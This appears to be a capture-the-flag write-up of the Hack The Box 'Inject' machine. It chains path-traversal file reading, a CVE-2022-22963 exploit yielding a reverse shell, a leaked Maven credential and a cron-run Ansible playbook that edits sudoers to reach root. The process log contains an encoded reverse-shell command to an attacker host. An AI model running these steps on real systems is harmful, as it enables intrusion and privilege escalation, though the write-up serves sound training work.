---
title: "Injection"
date: 2025-04-03T23:29:21+05:30
draft: false
github_link: "https://github.com/gurusabarish/hugo-profile"
author: "Garrisec"
tags:
  - Markdown syntax
  - Sample
  - example
image: /images/post.jpg
description: ""
toc:
---

## Introduction

Inject is an HTB Linux machine that is vulnerable to LFI, Remote Code Execution and privilege escalation using cron jobs.

## Enumeration

### Services

Running nmap to find out the services and information about them.

```
┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-a51kyldn5m]─[~]

└──╼ [★]$ sudo nmap 10.129.228.213 -sV

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 17:38 CST

Nmap scan report for 10.129.228.213

Host is up (0.083s latency).

Not shown: 998 closed tcp ports (reset)

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

8080/tcp open nagios-nsca Nagios NSCA

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds

Plain textCopyMore options
```

We have the SSH service running on port 22 and another called nagios-nsca running on port 8080, which is apparently a web application.

### HTTP[](#http)

![Injection Machine Image 1](/assets/img/injection-machine-2.png)


Let's start by fuzzing directories to try to find out more about the application.

```
┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-a51kyldn5m]─[~]
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -v -u http://10.129.228.213:8080/FUZZ -e .html -recursion 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.213:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 215ms]
| URL | http://10.129.228.213:8080/
    * FUZZ: 

[Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 81ms]
| URL | http://10.129.228.213:8080/register
    * FUZZ: register

[Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 80ms]
| URL | http://10.129.228.213:8080/blogs
    * FUZZ: blogs

[Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 80ms]
| URL | http://10.129.228.213:8080/upload
    * FUZZ: upload

[Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 88ms]
| URL | http://10.129.228.213:8080/environment
    * FUZZ: environment

[Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 81ms]
| URL | http://10.129.228.213:8080/error
    * FUZZ: error

[Status: 200, Size: 1086, Words: 137, Lines: 34, Duration: 114ms]
| URL | http://10.129.228.213:8080/release_notes
    * FUZZ: release_notes

[Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 132ms]
| URL | http://10.129.228.213:8080/
    * FUZZ: 

:: Progress: [441094/441094] :: Job [1/1] :: 332 req/sec :: Duration: [0:25:44] :: Errors: 0 ::

```

The `/upload` directory looks interesting, let's explore it further.

## Exploitation

### Local File Inclusion (LFI)

We have a function for uploading files. If we upload an image, we have the option of viewing that photo which is fetched via a parameter called img.

![Injection Machine Image 2](/assets/img/injection-machine-1.png)

Then, by trying to search for other files such as /etc/passwd, we succeed. To do this, let's use the wget command on the command line.

```
┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-a51kyldn5m]─[~]

└──╼ [★]$ wget http://10.129.228.213:8080/show_image?img=../../../../../../etc/passwd

--2025-01-22 20:19:37-- http://10.129.228.213:8080/show_image?img=../../../../../../etc/passwd

Connecting to 10.129.228.213:8080... connected.

HTTP request sent, awaiting response... 200

Length: 1986 (1.9K) [image/jpeg]

Saving to: ‘show_image?img=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd’

show_image?img=..%2F..%2F..%2F..%2F..%2F..%2Fet 100%[=====================================================================================================>] 1.94K --.-KB/s in 0s

2025-01-22 20:19:37 (295 MB/s) - ‘show_image?img=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd’ saved [1986/1986]

┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-a51kyldn5m]─[~]

└──╼ [★]$ ls

cacert.der Desktop Documents Downloads Music my_data Pictures Public 'show_image?img=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd' Templates Videos

┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-a51kyldn5m]─[~]

└──╼ [★]$ cat show_image\?img\=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin

systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

messagebus:x:103:106::/nonexistent:/usr/sbin/nologin

syslog:x:104:110::/home/syslog:/usr/sbin/nologin

_apt:x:105:65534::/nonexistent:/usr/sbin/nologin

tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false

uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin

tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin

landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin

pollinate:x:110:1::/var/cache/pollinate:/bin/false

usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

frank:x:1000:1000:frank:/home/frank:/bin/bash

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false

sshd:x:113:65534::/run/sshd:/usr/sbin/nologin

phil:x:1001:1001::/home/phil:/bin/bash

fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin

_laurel:x:997:996::/var/log/laurel:/bin/false

```

The application is using the Spring framework. By obtaining the pom.xml file, we can find out the version of the Spring module called cloud-function-web.

```
┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-a51kyldn5m]─[~]
└──╼ [★]$ cat show_image\?img\=..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2FWebApp%2Fpom.xml 
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>


```

Searching the web for vulnerabilities for this module, we found CVE-2022-22963. Using the PoC in the link above, we were able to obtain a reverse shell.

```
┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-p74kd4kr2v]─[~]
└──╼ [★]$ python3 exploit.py -u http://10.129.47.251:8080
[+] Target http://10.129.47.251:8080

[+] Checking if http://10.129.47.251:8080 is vulnerable to CVE-2022-22963...

[+] http://10.129.47.251:8080 is vulnerable

[/] Attempt to take a reverse shell? [y/n]y
listening on [any] 4444 ...
[$$] Attacker IP:  10.10.14.5
connect to [10.10.14.5] from (UNKNOWN) [10.129.47.251] 42450
bash: cannot set terminal process group (783): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ 


```

Enumerating user frank's directory we find a configuration file in the hidden .m2 directory called setting.xml. This file contains a credential for the user phil.

```
frank@inject:~/.m2$ cat setting.xml
cat setting.xml
cat: setting.xml: No such file or directory
frank@inject:~/.m2$ cat settings.xml
cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```

Using this credential we were able to log in as the user phil.

## Privilege Escalation

### Cron Job

Searching for cron jobs using the pspy tool, we found the cron job /usr/local/bin/ansible-parallel, which executes all the xml files in /opt/automation/tasks.

```
./pspy32 -pf  -i 1000   
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/01/25 00:22:02 FS:             OPEN DIR | /usr/lib/python3/dist-packages/ansible/utils
2025/01/25 00:22:02 CMD: UID=0     PID=2181   | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
2025/01/25 00:22:02 CMD: UID=0     PID=2180   | sleep 10 
2025/01/25 00:22:02 CMD: UID=0     PID=2179   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml 
2025/01/25 00:22:02 CMD: UID=0     PID=2178   | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/ 
2025/01/25 00:22:02 CMD: UID=0     PID=2177   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml 
2025/01/25 00:22:02 CMD: UID=0     PID=2174   | /usr/sbin/CRON -f 
2025/01/25 00:22:02 CMD: UID=0     PID=2173   | /usr/sbin/CRON -f 
2025/01/25 00:22:02 CMD: UID=1001  PID=2160   | ./pspy32 -pf -i 1000 
2025/01/25 00:22:02 CMD: UID=1001  PID=2154   | bash 
2025/01/25 00:22:02 CMD: UID=1001  PID=2149   | (sd-pam) 
2025/01/25 00:22:02 CMD: UID=1001  PID=2148   | /lib/systemd/systemd --user 
2025/01/25 00:22:02 CMD: UID=0     PID=2146   | 
2025/01/25 00:22:02 CMD: UID=0     PID=2142   | 
2025/01/25 00:22:02 CMD: UID=0     PID=2123   | su phil 
2025/01/25 00:22:02 CMD: UID=1000  PID=2116   | bash -i 
2025/01/25 00:22:02 CMD: UID=0     PID=2115   | 
2025/01/25 00:22:02 CMD: UID=1000  PID=2088   | bash -i 
2025/01/25 00:22:02 CMD: UID=1000  PID=2085   | bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i} 
2025/01/25 00:22:02 CMD: UID=0     PID=2082   | 
2025/01/25 00:22:02 CMD: UID=0     PID=1552   | 
2025/01/25 00:22:02 CMD: UID=107   PID=1007   | /usr/sbin/uuidd --socket-activation 
2025/01/25 00:22:02 CMD: UID=0     PID=963    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/01/25 00:22:02 CMD: UID=0     PID=962    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2025/01/25 00:22:02 CMD: UID=1     PID=952    | /usr/sbin/atd -f 
2025/01/25 00:22:02 CMD: UID=0     PID=947    | /usr/sbin/cron -f 
2025/01/25 00:22:02 CMD: UID=101   PID=896    | /lib/systemd/systemd-resolved 
2025/01/25 00:22:02 CMD: UID=0     PID=824    | /usr/sbin/ModemManager 
2025/01/25 00:22:02 CMD: UID=0     PID=807    | 
2025/01/25 00:22:02 CMD: UID=1000  PID=783    | /usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar 
2025/01/25 00:22:02 CMD: UID=0     PID=782    | /usr/lib/udisks2/udisksd 
2025/01/25 00:22:02 CMD: UID=0     PID=781    | /lib/systemd/systemd-logind 
2025/01/25 00:22:02 CMD: UID=104   PID=776    | /usr/sbin/rsyslogd -n -iNONE 
2025/01/25 00:22:02 CMD: UID=0     PID=775    | /usr/lib/policykit-1/polkitd --no-debug 
2025/01/25 00:22:02 CMD: UID=0     PID=773    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2025/01/25 00:22:02 CMD: UID=0     PID=769    | /usr/sbin/irqbalance --foreground 
2025/01/25 00:22:02 CMD: UID=103   PID=765    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/01/25 00:22:02 CMD: UID=0     PID=764    | /usr/lib/accountsservice/accounts-daemon 
2025/01/25 00:22:02 CMD: UID=0     PID=750    | 
2025/01/25 00:22:02 CMD: UID=0     PID=745    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2025/01/25 00:22:02 CMD: UID=0     PID=729    | /usr/bin/vmtoolsd 
2025/01/25 00:22:02 CMD: UID=0     PID=727    | /usr/bin/VGAuthService 
2025/01/25 00:22:02 CMD: UID=0     PID=701    | /sbin/auditd 
2025/01/25 00:22:02 CMD: UID=102   PID=700    | /lib/systemd/systemd-timesyncd 
2025/01/25 00:22:02 CMD: UID=0     PID=683    | 
2025/01/25 00:22:02 CMD: UID=0     PID=682    | 
2025/01/25 00:22:02 CMD: UID=0     PID=670    | /sbin/multipathd -d -s 
2025/01/25 00:22:02 CMD: UID=0     PID=669    | 
2025/01/25 00:22:02 CMD: UID=0     PID=668    | 
2025/01/25 00:22:02 CMD: UID=0     PID=667    | 
2025/01/25 00:22:02 CMD: UID=0     PID=666    | 
2025/01/25 00:22:02 CMD: UID=0     PID=551    | 
2025/01/25 00:22:02 CMD: UID=100   PID=550    | /lib/systemd/systemd-networkd 
2025/01/25 00:22:02 CMD: UID=0     PID=522    | /lib/systemd/systemd-udevd 
2025/01/25 00:22:02 CMD: UID=0     PID=489    | /lib/systemd/systemd-journald 

```

Taking a look at /usr/local/bin/ansible-parallel, we see that it imports a module called ansible_parallel. Ansible is an IT tool that allows you to manage hosts in an automated way, including modifying files via a yaml file called a playbook.

```
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from ansible_parallel import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())

```

First, let's create our playbook to modify the /etc/sudoers file that allows us to grant rights to users of the system, in this case let's create a playbook to add a line to this file to grant all rights to the phil user.

We put the following text inside a .yml file (for example, playbook.yml)

```
- hosts: localhost
  tasks: 
    - name: Replace a line  
      lineinfile:  
        path: /etc/sudoers
        line: phil ALL=(ALL) ALL

```

Let's transfer this file to the target machine via a python server.

```
┌─[eu-dedivip-2]─[10.10.14.5]─[garrisec@htb-p74kd4kr2v]─[~/Documents]
└──╼ [★]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

On the target machine, we request this file. Then we run the ansible-parallel program. Now with elevated privileges, using the sudo su command, we become the root user.

```
phil@inject:/opt/automation/tasks$ wget http://10.10.14.5:8000/playbook-escalation.yml
<wget http://10.10.14.5:8000/playbook-escalation.yml
--2025-01-25 03:34:09--  http://10.10.14.5:8000/playbook-escalation.yml
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 138 [application/octet-stream]
Saving to: ‘playbook-escalation.yml’

playbook-escalation 100%[===================>]     138  --.-KB/s    in 0s      

2025-01-25 03:34:09 (14.5 MB/s) - ‘playbook-escalation.yml’ saved [138/138]

phil@inject:/opt/automation/tasks$ /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
<al/bin/ansible-parallel /opt/automation/tasks/*.yml
/opt/automation/tasks/playbook_1.yml: Started                                                                                                                                                Done# Playbook /opt/automation/tasks/playbook_1.yml, ran in 2s
localhost                  : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   

phil@inject:/$ sudo su
sudo su
root@inject:~# cd /root
cd /root
root@inject:~# ls
ls
playbook_1.yml  root.txt
root@inject:~# cat root.txt
cat root.txt
b3ea5d1e66b523aa1130b97aee6929a5

```
